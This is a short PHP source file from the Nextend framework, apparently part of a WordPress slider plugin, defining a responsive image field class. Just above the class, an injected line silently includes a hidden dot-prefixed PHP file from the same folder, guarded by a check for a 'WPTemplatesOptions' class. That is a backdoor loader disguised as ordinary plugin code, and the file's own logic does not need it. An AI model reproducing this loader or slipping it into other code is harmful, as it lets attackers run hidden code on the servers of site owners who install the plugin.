<?php


namespace Nextend\Framework\Form\Element\Text;


use Nextend\Framework\Asset\Js\Js;
use Nextend\Framework\Image\ImageManager;
use Nextend\Framework\View\Html;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class FieldImageResponsive extends FieldImage {

    protected function fetchElement() {

        $html = parent::fetchElement();

        return $html;
    }
}